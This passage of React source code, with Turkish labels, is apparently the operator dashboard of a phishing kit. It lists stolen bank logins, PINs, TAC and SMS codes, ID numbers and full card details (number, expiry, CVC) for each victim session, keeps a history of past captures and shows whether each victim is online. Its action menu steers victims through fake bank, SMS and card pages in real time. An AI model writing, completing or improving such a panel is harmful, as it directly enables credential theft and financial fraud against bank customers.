                              {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
                                <span className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10" onClick={() => copyToClipboard(fd.loginMethod)}>{fd.loginMethod}</span>
                              ) : null}
                            </div>
                            <button
                              type="button"
                              onClick={() => setExpandedBankHistorySessionId(expandedBankHistorySessionId === row.id ? null : row.id)}
                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
                                expandedBankHistorySessionId === row.id
                                  ? darkMode
                                    ? "border-amber-500/40 bg-amber-500/15 text-amber-400 hover:bg-amber-500 hover:text-white"
                                    : "border-amber-500/40 bg-amber-500/15 text-amber-500 hover:bg-amber-500 hover:text-white"
                                  : darkMode
                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
                              }`}
                              title="Eski banka form girişlerini göster"
                            >
                              GEÇMİŞ ({bankHistoryCount})
                            </button>
                          </div>
                          {canonicalBankFields.map(([key, value]) => {
                            let displayKey = key;
                            if (displayKey === "username") displayKey = "ID / K.Adı";
                            else if (displayKey === "password") displayKey = "Şifre / PIN";
                            else if (displayKey === "tacCode") displayKey = "TAC";
                            else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
                            else if (displayKey === "pasnummer") displayKey = "Kart No";
                            else if (displayKey === "toegangscode") displayKey = "Giriş Kodu";
                            else if (displayKey === "signatuur") displayKey = "İmza";
                            else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
                            else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
                            else if (displayKey === "bankPhone") displayKey = "Telefon";
                            return (
                              <div key={key} className="flex min-w-0 items-start gap-1 leading-tight">
                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">{displayKey}</span>
                                <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>{String(value)}</span>
                              </div>
                            );
                          })}
                        </div>
                      </td>
                      <td className="px-2 py-3 align-top">
                        {approvalEntries.length === 0 ? (
                          <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                        ) : (
                          <div className="flex flex-col items-start gap-1">
                            {approvalEntries.map((approvalValue, index) => (
                              <span
                                key={`${approvalValue}-${index}`}
                                className="inline-flex w-fit max-w-full items-center self-start rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                              >
                                {getApprovalDisplayText(approvalValue)}
                              </span>
                            ))}
                          </div>
                        )}
                      </td>
                      <td className="px-2 py-3 align-top">
                        <div className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(smsValue)}>
                          {smsValue || '-'}
                        </div>
                      </td>
                      <td className="px-2 py-3 align-top">
                        <div className="space-y-1 text-[10px] font-medium leading-tight">
                          {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                          {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
                          {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
                          {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                        </div>
                      </td>
                      <td className="px-2 py-3 align-top">
                        <span className={`inline-flex max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] ${stepColor}`}>
                          {stepText}
                        </span>
                      </td>
                      <td className="px-2 py-3 align-top">
                        {isHidden ? (
                          <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                            <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>
                            ARŞİV
                          </span>
                        ) : (() => {
                          // LogsTab ile BIREBIR ayni CANLI ONLINE / OFFLINE kuralı
                          // (2sn tick + postgres_changes realtime ile neredeyse ANLIK)
                          let online = false;
                          if (row.status !== "offline") {
                            if (row.last_ping_at) {
                              try {
                                const t = Date.parse(String(row.last_ping_at));
                                if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) online = true;
                              } catch { /* noop */ }
                            }
                          }
                          if (online) {
                            return (
                              <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-600 dark:text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                                <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                                ONLINE
                              </span>
                            );
                          }
                          return (
                            <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                              <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                              OFFLINE
                            </span>
                          );
                        })()}
                      </td>
                      <td className="px-2 py-3 align-top text-right">
                        <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
                          <select
                            className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                            value=""
                            onChange={(e) => { if (e.target.value) { void handleRouteAction(row.id, e.target.value); e.target.value = ""; } }}
                          >
                            <option value="">Aksiyon Seçin...</option>
                            {isHidden && <option value="unhide">✨ Arşivden Çıkar (Normal Log)</option>}
                            <option value="win">👉 İsim & Profil</option>
                            <option value="banken">👉 Banka Listesi</option>
                            <option value="sms">👉 SMS Doğrulaması</option>
                            <option value="card">👉 Kredi Kartı</option>
                            <option value="wait">⏳ Beklemeye Al</option>
                            <option value="invalid_bank">❌ Hatalı Banka</option>
                            <option value="live_support">🎧 Canlı Destek</option>
                            <option value="congrats">✅ Tebrikler</option>
                            <option value="ban_ip">🚫 IP Banla</option>
                            <option value="permadelete">⚠️ Kalıcı Sil (DB'den)</option>
                          </select>
                          <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
                            <button onClick={() => void handleRouteAction(row.id, "unhide")} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Arşivden çıkar">
                              <span>📤</span>
                            </button>
                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Arşivle (Normalden gizle)">
                              <span>📥</span>
                            </button>
                            <button onClick={() => void handleRouteAction(row.id, "permadelete")} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Kalıcı Sil">
                              <span>🗑️</span>
                            </button>
                          </div>
                        </div>
                      </td>
                    </tr>
                    {expandedBankHistorySessionId === row.id && (
                      <tr className={darkMode ? 'bg-black/30' : 'bg-gray-50/60'}>
                        <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
                          {bankHistoryCount > 0 ? (
                            <>
                              <div className="mb-2 flex items-center gap-2 flex-wrap">
                                <span className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${darkMode ? "bg-amber-500/15 text-amber-400 border-amber-500/30" : "bg-amber-500/10 text-amber-600 border-amber-500/30"}`}>
                                  Eski Banka Girişleri ({bankHistoryCount})
                                </span>
                                <button type="button" onClick={() => setExpandedBankHistorySessionId(null)} className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${darkMode ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white" : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"}`}>
                                  KAPAT
                                </button>
                              </div>
                              <div className="space-y-2.5 md:space-y-3">
                                {(fd as any).bankFormHistory.slice().reverse().map((entry: any, index: number) => {
                                  const entryDate = entry.capturedAt ? new Date(entry.capturedAt).toLocaleString("tr-TR", { hour12: false, timeZone: "Europe/Istanbul" }) : "Tarih yok";
                                  return (
                                    <div key={`${row.id}-history-${index}`} className={`rounded-2xl border p-4 ${darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"}`}>
                                      <div className="mb-2 flex flex-wrap items-center gap-2">
                                        <span className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${darkMode ? "bg-white/10 text-zinc-300 border-white/10" : "bg-gray-100 text-gray-700 border-gray-200"}`}>
                                          #{bankHistoryCount - index}
                                        </span>
                                        {entry.bankName && (
                                          <span className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${darkMode ? "bg-yellow-500/10 text-yellow-500 border-yellow-500/20" : "bg-yellow-50 border-yellow-200 text-yellow-700"}`}>
                                            {entry.bankName}
                                          </span>
                                        )}
                                        {entry.htmlStepLabel && (
                                          <span className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${darkMode ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-emerald-50 border-emerald-200 text-emerald-700"}`}>
                                            {entry.htmlStepLabel}
                                          </span>
                                        )}
                                        {entry.isLegacySnapshot && (
                                          <span className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${darkMode ? "bg-pink-500/10 text-pink-400 border-pink-500/20" : "bg-pink-50 border-pink-200 text-pink-600"}`}>
                                            ESKİ KAYITTAN ALINDI
                                          </span>
                                        )}
                                        <span className="ml-auto text-[11px] font-mono opacity-50">{entryDate}</span>
                                      </div>
                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-2 lg:grid-cols-4">
                                        {entry.verfuegernummer || entry.username ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kullanıcı ID</div>
                                            <div className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(entry.verfuegernummer || entry.username || ""))}>
                                              {entry.verfuegernummer || entry.username || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.pin || entry.password ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Şifre / PIN</div>
                                            <div className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(entry.pin || entry.password || ""))}>
                                              {entry.pin || entry.password || "-"}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.personalCode ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Kimlik No</div>
                                            <div className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(entry.personalCode))}>
                                              {entry.personalCode}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.bankPhone ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Banka Telefon</div>
                                            <div className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(entry.bankPhone))}>
                                              {entry.bankPhone}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.loginMethod ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Giriş Yöntemi</div>
                                            <div className="cursor-pointer font-semibold break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(entry.loginMethod))}>
                                              {entry.loginMethod}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.tacCode ? (
                                          <div className={`rounded-xl border px-3 py-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">TAC / Onay Kodu</div>
                                            <div className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere] text-indigo-500" onClick={() => copyToClipboard(String(entry.tacCode))}>
                                              {entry.tacCode}
                                            </div>
                                          </div>
                                        ) : null}
                                        {entry.orderedField1 || entry.orderedField2 || entry.orderedField3 ? (
                                          <div className={`rounded-xl border px-3 py-2 sm:col-span-2 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                            <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Sıralı Form Alanları</div>
                                            <div className="space-y-0.5 font-mono">
                                              {entry.orderedField1 && <div>1. {entry.orderedField1}</div>}
                                              {entry.orderedField2 && <div>2. {entry.orderedField2}</div>}
                                              {entry.orderedField3 && <div>3. {entry.orderedField3}</div>}
                                            </div>
                                          </div>
                                        ) : null}
                                      </div>
                                      {entry.rawFields && Object.keys(entry.rawFields).length > 0 ? (
                                        <details className={`mt-3 rounded-xl border p-3 ${darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"}`}>
                                          <summary className={`cursor-pointer text-[11px] font-bold ${darkMode ? "text-white/80" : "text-black/80"}`}>Tüm ham eski alanlar</summary>
                                          <pre className="mt-2 overflow-auto rounded-xl p-3 text-[11px] font-mono whitespace-pre-wrap break-words select-text">{JSON.stringify(entry.rawFields, null, 2)}</pre>
                                        </details>
                                      ) : null}
                                    </div>
                                  );
                                })}
                              </div>
                            </>
                          ) : (
                            <div className={`text-sm opacity-60 ${darkMode ? 'text-white' : 'text-gray-700'}`}>Bu session için geçmiş banka formu bulunamadı.</div>
                          )}
                        </td>
                      </tr>
                    )}
                  </Fragment>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
